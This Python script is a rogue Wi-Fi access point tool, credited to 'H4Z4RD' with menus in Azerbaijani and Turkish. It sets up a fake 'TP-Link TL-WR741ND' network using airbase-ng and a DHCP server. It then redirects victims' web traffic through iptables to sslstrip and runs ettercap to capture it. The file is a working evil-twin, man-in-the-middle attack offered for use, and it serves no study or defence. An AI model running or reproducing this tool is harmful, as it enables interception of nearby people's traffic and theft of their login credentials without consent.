#!/usr/bin/python3

import os
import shlex
import sys
import subprocess
import time


# Consol rəngləri
W  = '\033[0m'  # ağ (normal)
R  = '\033[31m' # qırmızı
G  = '\033[32m' # yazıl
O  = '\033[33m' # narıncı
B  = '\033[34m' # göy
C  = '\033[36m' # cyan


fm=(R+"""
 ##################################################
 #                                                #
 #                H4AP by H4Z4RD                  #
 #                twitter/H4Z4RD_                 #
 #                   V : 2.0.0                    #
 #                                                #
 ##################################################
"""+W)


os.system("clear")
time.sleep(0.1)
print(R+"888    888     d8888         d8888 8888888b.")
time.sleep(0.1)
print("888    888    d8P888        d88888 888   Y88b")
time.sleep(0.1)
print("888    888   d8P 888       d88P888 888    888")
time.sleep(0.1)
print("8888888888  d8P  888      d88P 888 888   d88P")
time.sleep(0.1)
print('888    888 d88   888     d88P  888 8888888P"')
time.sleep(0.1)
print("888    888 8888888888   d88P   888 888")
time.sleep(0.1)
print("888    888       888   d8888888888 888")
time.sleep(0.1)
print("888    888       888  d88P     888 888"+W)

print("")
print("")
print("")
print("")
print("                   "+R+"V : 2.0.0"+W)
print("")
print("               "+O+"Created By H4Z4RD"+W)
print("")
print("           "+B+"http://Twitter.com/H4Z4RD_"+W)
print("")
print("          "+C+"https://github.com/H4Z4RD-4Z/"+W)

time.sleep(5)
os.system("clear")
os.system("clear")




dhcp_server_not_found=""
dhcp_server_installed=""
abort_process=""
try_again=""
interface_select_1=""
interface_select_2=""
monitor_active=""
monitor_active_succes=""
service_start=""
file_created=""
geteway_ip_select=""
iface_name_select=""

def lang():
    global dhcp_server_not_found
    global dhcp_server_installed
    global abort_process
    global try_again
    global interface_select_1
    global interface_select_2
    global monitor_active
    global service_start
    global file_created
    global geteway_ip_select
    global iface_name_select

    while(True):
        print(fm)
        print(G+"   "+"Select your language"+W)
        print(" ")
        print("   "+C+"1) "+W+"Azerbaijani")
        print("   "+C+"2) "+W+"Turkish")
        print("")
        secim = input("   "+"#>" + " ")
        if secim == "1":
            dhcp_server_not_found = "isc-dhcp-server tapılmadı! İndi yüklənsin? Y/N"
            dhcp_server_installed = "isc-dhcp-server uğurla yükləndi"
            abort_process = "Prosses təxrə salınır..."
            try_again = "Yenidən yoxlayın"
            interface_select_1 = "İstifadə etmək istədiyiniz Interface adını yazın (ex:wlan0) : "
            interface_select_2 = "Monitor mode uğurla aktiv edildi.\nYuxarıdakı Monitor Interface adını yenidən yazın (ex:wlan0mon) : "
            monitor_active = "Monitor mode aktiv edilir..."
            service_start = "Servislər başladılır..."
            file_created = "Fayl uğurla yaradıldı"
            geteway_ip_select = "Geteway ipsini yazın. (route -n əmri ilə görə bilərsiniz) : "
            iface_name_select = "Iface adını yazın (route -n əmri ilə görə bilərsiniz) : "
            os.system('clear')
            break
        elif secim == "2":
            dhcp_server_not_found = "isc-dhcp-server bulunamadı! Şimdi kurulsunmu? Y/N"
            dhcp_server_installed = "isc-dhcp-server başarıyla kuruldu"
            abort_process = "İşlem iptal ediliyor..."
            try_again = "Yeniden deneyin"
            interface_select_1 = "Kullanmak istediğiniz Interface adını girin (ex:wlan0): "
            interface_select_2 = "Monitor mode başarıyla aktif edildi.\nYukarıdakı Monitor Interface ismini yeniden girin (ex:wlan0mon) : "
            monitor_active = "Monitor mode aktif ediliyor..."
            service_start = "İşlemler başlatılıyor..."
            file_created = "Dosya başarıyla oluşturuldu"
            geteway_ip_select = "Geteway ipsini girin . (route -n komutu ile göre bilirsiniz. ) : "
            iface_name_select = "Iface adını girin (route -n komutu ilə göre bilirsiniz) : "
            os.system('clear')
            break
        else:
            print(R+"Command not found! Try again!: "+W)
            time.sleep(1)
            os.system('clear')
            continue
try:
    lang()
except KeyboardInterrupt:
    print(" ")
    print(R + "Exiting..." + W)
    sys.exit()

def server():
    while(True):
        if not os.path.isfile('/usr/sbin/dhcpd'):
           yukle = input("["+R+"-"+W+"]"+" "+dhcp_server_not_found)
           if yukle == "Y" or "y":
               subprocess.check_output('sudo apt-get -y install isc-dhcp-server', shell=True)
               print(G+dhcp_server_installed+W)

           elif yukle == "N" or "n":
               print("["+R+"-"+W+"]"+" "+abort_process)
               time.sleep(3)
               sys.exit()

           else:
               print(try_again)

               continue

        else:
            break


def faylyarat():

    fayl = open("/etc/dhcpd.conf", "w")
    yazi = """authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name "TP-Link TL-WR741ND";
option domain-name-servers 192.168.1.1;
range 192.168.1.2 192.168.1.40;
}"""





    fayl.write(yazi)


def airmon():


    global moninterface


    print(fm)
    print(G + file_created + W)
    os.system("sudo airmon-ng")
    interface = input(G+interface_select_1+W)

    subprocess.check_output('sudo airmon-ng start' + ' ' + interface, shell=True)

    print(G+monitor_active+W)

    os.system('clear')
    print(fm)
    os.system('sudo airmon-ng')

    moninterface = input(G+interface + " " + interface_select_2+W)

    print(service_start)

    def airbase():
        global moninterface

        subprocess.Popen(shlex.split('xterm -e' + ' ' + "airbase-ng -c 11 -e 'TP-Link TL-WR741ND'"+" "+moninterface))
    airbase()


def service():

    os.system('clear')
    print(fm)
    print("["+G+"ok"+W+"]"+" "+service_start+" "+"0%")
    os.system('ifconfig at0 192.168.1.1 netmask 255.255.255.0')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"10%")
    os.system('ifconfig at0 mtu 1400')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"20%")
    os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"30%")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"40%")
    getawayip = input(G+geteway_ip_select+W)
    os.system('iptables -t nat -A PREROUTING -p udp -j DNAT --to' + ' ' + getawayip)
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"60%")
    os.system('iptables -P FORWARD ACCEPT')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"70%")
    os.system('iptables --append FORWARD --in-interface at0 -j ACCEPT')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"80%")
    ifase = input(G+iface_name_select+W)
    os.system('iptables --table nat --append POSTROUTING --out-interface' + ' ' + ifase + ' ' + '-j MASQUERADE')
    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
    print("[" + G + "ok" + W + "]" + " " + service_start + " "+"90%")
    os.system('dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0')
    print("[" + G + "ok" + W + "]" + " " + service_start + " " + "100%")
    os.system('/etc/init.d/isc-dhcp-server start')
    os.system('clear')
    subprocess.Popen(shlex.split('xterm -e "sslstrip -f -p -k 10000"'))
    time.sleep(5)
    os.system('ettercap -p -u -T -q -i at0')


try:
    server()
    faylyarat()
    airmon()
    time.sleep(5)
    service()
except KeyboardInterrupt:
    print(" ")
    print(R+"Exiting..."+W)
    time.sleep(2)
    os.system('clear')
